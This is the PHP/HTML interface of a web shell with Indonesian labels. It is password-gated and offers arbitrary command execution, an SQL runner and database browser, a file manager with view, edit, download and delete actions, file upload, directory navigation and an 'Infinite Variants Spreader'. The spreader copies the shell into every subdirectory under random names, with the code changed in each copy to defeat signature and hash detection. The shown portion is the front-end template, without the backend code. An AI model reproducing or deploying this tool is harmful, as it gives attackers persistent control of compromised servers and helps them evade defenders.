<?php if (isset($cd_error)) echo "<p class='error'>$cd_error</p>"; ?>
<?php echo $action_result; ?>

<!-- Command execution -->
<div class="box">
    <h3>⚡ Execute Command</h3>
    <form method="post">
        <input type="text" name="cmd" size="80" placeholder="Enter command" autofocus value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>">
        <input type="submit" value="Execute">
        <label>
            <input type="checkbox" name="realtime" value="1"> Real-time streaming (progressive output)
        </label>
    </form>
    <?php echo $output; ?>
</div>

<div class="box">
    <h3>🗄️ Database Manager</h3>
    <?php echo $db_msg; ?>
    <?php if (!$db_connected): ?>
        <form method="post" class="db-form">
            <div class="db-form-grid">
                <div>
                    <label>Driver</label>
                    <select name="db_driver">
                        <option value="mysql">MySQL</option>
                        <option value="pgsql">PostgreSQL</option>
                    </select>
                </div>
                <div>
                    <label>Host</label>
                    <input type="text" name="db_host" value="127.0.0.1" placeholder="Host">
                </div>
                <div>
                    <label>Port</label>
                    <input type="text" name="db_port" value="" placeholder="3306/5432">
                </div>
                <div>
                    <label>Database</label>
                    <input type="text" name="db_name" value="" placeholder="Nama DB">
                </div>
                <div>
                    <label>User</label>
                    <input type="text" name="db_user" value="" placeholder="User">
                </div>
                <div>
                    <label>Password</label>
                    <input type="password" name="db_pass" value="" placeholder="Password">
                </div>
            </div>
            <div style="margin-top:10px;display:flex;gap:8px;align-items:center;">
                <input type="submit" name="db_connect" value="Tes & Connect">
                <a href="adminer-5.4.2.php" target="_blank">Buka Adminer (Full Manager)</a>
            </div>
        </form>
    <?php else: ?>
        <form method="post" style="margin-bottom:12px;">
            <input type="submit" name="db_disconnect" value="Disconnect">
            <a href="adminer-5.4.2.php" target="_blank" style="margin-left:8px;">Buka Adminer (Full Manager)</a>
        </form>
        <div class="db-grid">
            <div>
                <h4>Daftar Tabel</h4>
                <div style="margin-bottom:8px;display:flex;gap:8px;align-items:center;">
                    <input id="db_filter" type="text" placeholder="Cari tabel...">
                    <form method="get" style="display:flex;gap:6px;align-items:center;margin:0;">
                        <input type="hidden" name="pass" value="<?php echo htmlspecialchars($_SESSION['pass']); ?>">
                        <label>Limit</label>
                        <input type="number" name="db_limit" min="1" max="1000" value="<?php echo isset($_GET['db_limit']) ? intval($_GET['db_limit']) : 50; ?>" style="width:90px;">
                        <input type="submit" value="Set">
                    </form>
                </div>
                <div class="table-scroll">
                    <table id="db_table_list">
                        <tr><th>Nama Tabel</th><th>Aksi</th></tr>
                        <?php foreach ($db_tables as $t): ?>
                            <tr>
                                <td><?php echo htmlspecialchars($t); ?></td>
                                <td><a href="?pass=<?php echo urlencode($_SESSION['pass']); ?>&db_table=<?php echo urlencode($t); ?>&db_limit=<?php echo isset($_GET['db_limit']) ? intval($_GET['db_limit']) : 50; ?>">Browse</a></td>
                            </tr>
                        <?php endforeach; ?>
                    </table>
                </div>
            </div>
            <div>
                <h4>SQL Runner</h4>
                <form method="post">
                    <textarea name="db_sql" rows="8" placeholder="Tulis SQL di sini"></textarea>
                    <div style="margin-top:8px;">
                        <input type="submit" name="db_run_sql" value="Jalankan">
                    </div>
                </form>
            </div>
        </div>
        <?php echo $db_result_html; ?>
    <?php endif; ?>
    <p style="margin-top:8px;color:#cfcfcf;">Isi kredensial sendiri untuk terhubung. Gunakan Adminer untuk manajemen lengkap.</p>
</div>

<div class="layout-row">
    <div class="layout-col file-list">
        <div class="box">
            <h3>📁 File Manager</h3>
            <form method="post" style="margin:0 0 10px 0;display:flex;gap:8px;align-items:center;">
                <input type="text" name="new_file_name" placeholder="Nama file baru..." required>
                <input type="submit" name="new_file_create" value="Create & Edit">
            </form>
            <form method="post" onsubmit="return confirm('Yakin hapus item terpilih?');">
                <table id="file_table">
                    <tr><th class="sel-col"><input type="checkbox" id="sel_all"></th><th>Name</th><th>Size</th><th>Actions</th></tr>
                    <?php foreach ($files as $file): ?>
                        <?php if ($file == '.' || $file == '..') continue; ?>
                        <?php $full = $cwd . DIRECTORY_SEPARATOR . $file; ?>
                        <?php $is_dir = is_dir($full); ?>
                        <tr>
                            <td class="sel-col"><input type="checkbox" name="sel[]" value="<?php echo htmlspecialchars($file); ?>"></td>
                            <td class="name-cell"><span class="icon"><?php echo $is_dir ? "📁" : "📄"; ?></span><span class="filename"><?php echo htmlspecialchars($file); ?></span></td>
                            <td><?php echo $is_dir ? '&lt;DIR&gt;' : filesize($full); ?></td>
                            <td class="actions">
                                <?php if (!$is_dir): ?>
                                    <a href="?pass=<?php echo urlencode($_SESSION['pass']); ?>&view=<?php echo urlencode($file); ?>" title="View file">👁 View</a>
                                    <a href="?pass=<?php echo urlencode($_SESSION['pass']); ?>&edit=<?php echo urlencode($file); ?>" title="Edit file">✎ Edit</a>
                                    <a href="?pass=<?php echo urlencode($_SESSION['pass']); ?>&download=<?php echo urlencode($file); ?>" title="Download file">⬇️ Download</a>
                                    <a href="?pass=<?php echo urlencode($_SESSION['pass']); ?>&delete=<?php echo urlencode($file); ?>" title="Delete file" onclick="return confirm('Delete this file?')">🗑 Delete</a>
                                <?php else: ?>
                                    <a href="?pass=<?php echo urlencode($_SESSION['pass']); ?>&cd=<?php echo urlencode($file); ?>" title="Open folder">➡️ Open</a>
                                <?php endif; ?>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </table>
                <div style="margin-top:8px;display:flex;gap:8px;">
                    <input type="submit" name="bulk_delete" value="🧹 Delete Selected">
                </div>
            </form>
            <script>
              (function(){
                var sa=document.getElementById('sel_all');
                if(sa){
                  sa.addEventListener('change',function(){
                    var t=document.getElementById('file_table'); if(!t) return;
                    var cbs=t.querySelectorAll('input[type="checkbox"][name="sel[]"]');
                    for(var i=0;i<cbs.length;i++){ cbs[i].checked=sa.checked; }
                  });
                }
              })();
            </script>
        </div>
    </div>
    <div class="layout-col editor-col">
        <?php echo $editor_html !== '' ? $editor_html : "<div class=\"box\"><h3>📝 Editor</h3><p>Pilih file untuk melihat atau edit.</p></div>"; ?>
    </div>
</div>

<!-- Upload Form -->
<div class="box">
    <h3>📤 Upload File</h3>
    <form method="post" enctype="multipart/form-data">
        <?php if ($effective_upload_bytes > 0): ?>
            <input type="hidden" name="MAX_FILE_SIZE" value="<?php echo (int)$effective_upload_bytes; ?>">
        <?php endif; ?>
        <div class="upload-grid">
            <input type="file" id="upload_input" name="upload" required>
            <input type="text" id="upload_name" name="upload_name" placeholder="Nama file (opsional)">
            <input type="submit" value="Upload">
        </div>
        <p style="margin-top:8px;color:#cfcfcf;">Limits: upload_max_filesize <?php echo htmlspecialchars($max_upload); ?>, post_max_size <?php echo htmlspecialchars($max_post); ?></p>
    </form>
</div>

<!-- Directory Changer -->
<div class="box">
    <h3>📂 Change Directory</h3>
    <form method="get">
        <input type="hidden" name="pass" value="<?php echo htmlspecialchars($_SESSION['pass']); ?>">
        <input type="text" name="cd" size="40" placeholder="Enter path (absolute or relative)" list="paths_datalist">
        <datalist id="paths_datalist"><?php echo $dir_datalist; ?></datalist>
        <input type="submit" value="Go">
    </form>
</div>

<!-- Smart Spreader -->
<div class="box">
    <h3>🌀 Infinite Variants Spreader</h3>
    <p>Copy this shell into all subdirectories with:</p>
    <ul>
        <li>✨ Completely random filename (8-20 alphanumeric chars)</li>
        <li>🔀 Unique code variant each time (20+ transformations applied randomly)</li>
        <li>🔒 No two copies are identical – defeats signature & hash detection</li>
    </ul>
    <form method="post">
        <input type="hidden" name="spread" value="1">
        <label>
            <input type="checkbox" name="recursive" value="1"> Recursive (include sub-subdirectories)
        </label>
        <input type="submit" value="🚀 Spread Now">
    </form>
</div>

<!-- Quick links -->
<div class="box">
    <h3>🔗 Quick Links</h3>
    <a href="?pass=<?php echo urlencode($_SESSION['pass']); ?>">⟲ Refresh</a> |
    <a href="?pass=<?php echo urlencode($_SESSION['pass']); ?>&cd=..">⬆ Parent Directory</a> |
    <a href="?pass=<?php echo urlencode($_SESSION['pass']); ?>&cd=<?php echo urlencode($_SERVER['DOCUMENT_ROOT']); ?>">🏠 Document Root</a>
</div>
<script>
(function(){
  var f = document.getElementById('db_filter');
  if (f) {
    f.addEventListener('input', function(){
      var val = f.value.toLowerCase();
      var table = document.getElementById('db_table_list');
      if (!table) return;
      var rows = table.getElementsByTagName('tr');
      for (var i=1;i<rows.length;i++){
        var cell = rows[i].getElementsByTagName('td')[0];
        if (!cell) continue;
        var name = cell.textContent.toLowerCase();
        rows[i].style.display = name.indexOf(val) !== -1 ? '' : 'none';
      }
    });
  }
  var ui = document.getElementById('upload_input');
  var un = document.getElementById('upload_name');
  if (ui && un) {
    ui.addEventListener('change', function(){
      var v = ui.value.split(/[/\\]/).pop();
      if (un.value.trim() === '') { un.value = v; }
    });
  }
})();
</script>
</body>
</html>
